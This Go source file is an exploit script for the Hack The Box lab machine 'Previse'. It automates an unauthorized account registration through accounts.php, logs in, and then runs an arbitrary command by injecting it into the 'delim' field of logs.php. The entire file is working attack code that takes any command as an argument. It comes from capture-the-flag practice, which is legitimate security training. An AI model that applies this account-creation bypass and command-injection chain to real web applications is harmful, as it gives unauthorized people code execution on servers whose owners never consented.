package main

// Hackthebox: Previse
// USAGE: ./previse <command>
// 1) Unauthorized account creation
// 2) Authenticated remote code execution

import (
    "fmt"
    "os"
    "net/http"
    "net/http/cookiejar"
    "net/url"
    "strings"
)

func main() {
    // command to execute
    if len(os.Args) != 2 {
        fmt.Println("Usage: " + os.Args[0] + " \"<command>\"")
        return
    }
    cmd := os.Args[1]

    // Register a user
    username := "alterego"
    password := "alterego"
    response := register(username, password)
    
    // Create a session
    jar, _ := cookiejar.New(nil)
    client := &http.Client{
        Jar: jar,
    }

    // login
    response = login(client, response.Cookies(), username, password)

    // remote code execution
    rce(client, response.Cookies(), cmd)
}

// Register with a username and password
func register(username, password string) (*http.Response) {
    endpoint := "http://10.10.11.104/accounts.php"

    // create post form data
    data := url.Values{
        "username": {username},
        "password": {password},
        "confirm":  {password},
    }

    // Send the post form and return the response
    response, _ := http.PostForm(endpoint, data)
    fmt.Println(response.StatusCode)
    return response
}

// Login with the username and password
func login(client *http.Client, cookies []*http.Cookie, username, password string) (*http.Response) {

    // Send post form data to the login page
    endpoint := "http://10.10.11.104/login.php"
    urlobj, _ := url.Parse(endpoint)
    data := url.Values{
        "username":{username},
        "password":{password},
    }

    // Set the cookies (from the previous register request)
    client.Jar.SetCookies(urlobj, cookies)
    request, _ := http.NewRequest("POST", endpoint, strings.NewReader(data.Encode()))
    request.Header.Set("Content-Type", "application/x-www-form-urlencoded")

    // Make the post request and return the response
    response, err := client.Do(request)
    check(err)
    defer response.Body.Close()
    fmt.Println(response.StatusCode)
    return response
}

// Authenticated remote code execution
func rce(client *http.Client, cookies []*http.Cookie, cmd string) (*http.Response){
    // Send post form data to the logs page
    endpoint := "http://10.10.11.104/logs.php"
    urlobj, _ := url.Parse(endpoint)
    data := url.Values{
        "delim": {"comma; " + cmd}, // command injection in the delim field
    }

    // Set the cookies (from the previous login request)
    client.Jar.SetCookies(urlobj, cookies)
    request, _ := http.NewRequest("POST", endpoint, strings.NewReader(data.Encode()))
    request.Header.Set("Content-Type", "application/x-www-form-urlencoded")

    // Make the post request and return the response
    response, err := client.Do(request)
    check(err)
    defer response.Body.Close()
    fmt.Println(response.StatusCode)
    return response
}

// Check for http errors
func check(err error) {
    if err != nil {
        fmt.Println("Could not make request")
        fmt.Println(err)
        os.Exit(1)
    }
}
